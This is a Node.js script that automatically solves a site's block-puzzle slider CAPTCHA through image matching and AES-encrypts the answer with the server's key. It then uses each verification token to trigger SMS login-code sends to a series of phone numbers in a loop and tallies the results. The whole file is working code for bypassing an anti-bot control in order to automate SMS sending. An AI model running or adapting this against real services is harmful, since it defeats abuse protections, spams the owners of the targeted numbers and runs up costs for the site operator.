import {B,H,j,aes,solveV2} from './lib_captcha.mjs';
import crypto from 'node:crypto';
async function ticket(){
  const uid=crypto.randomUUID();
  const cap=await j(fetch(B+'/api/auth/captcha/behavior?'+new URLSearchParams({captchaType:'blockPuzzle',clientUid:uid,ts:String(Date.now())}),{headers:H}));
  const d=cap.data;
  const r=solveV2(Buffer.from(d.originalImageBase64,'base64'),Buffer.from(d.jigsawImageBase64,'base64'));
  const best=r.nccTop[0];
  const pointJson=aes(JSON.stringify({x:best.dx,y:5}),d.secretKey);
  const chk=await j(fetch(B+'/api/auth/captcha/behavior',{method:'POST',headers:H,body:JSON.stringify({captchaType:'blockPuzzle',token:d.token,pointJson,clientUid:uid,ts:Date.now()})}));
  if(chk?.data?.repCode!=='0000')return {fail:'check'};
  return {token:d.token,clientUid:uid,captchaVerification:aes(d.token+'---'+pointJson,d.secretKey),x:best.dx};
}
const tally={};
for(let i=0;i<8;i++){
  const c=await ticket();
  if(c.fail){console.log(i,'check-fail');continue;}
  const phone='199000001'+String(50+i);
  const r=await j(fetch(B+'/api/auth/sms/send',{method:'POST',headers:H,body:JSON.stringify({phone,scene:'login',captchaType:'blockPuzzle',token:c.token,clientUid:c.clientUid,ts:Date.now(),captchaVerification:c.captchaVerification})}));
  const key=r.code+':'+r.msg;
  tally[key]=(tally[key]||0)+1;
  console.log(i,'x='+c.x,'phone='+phone,'->',r.code,r.msg);
  await new Promise(r=>setTimeout(r,400));
}
console.log('\nTALLY', JSON.stringify(tally));
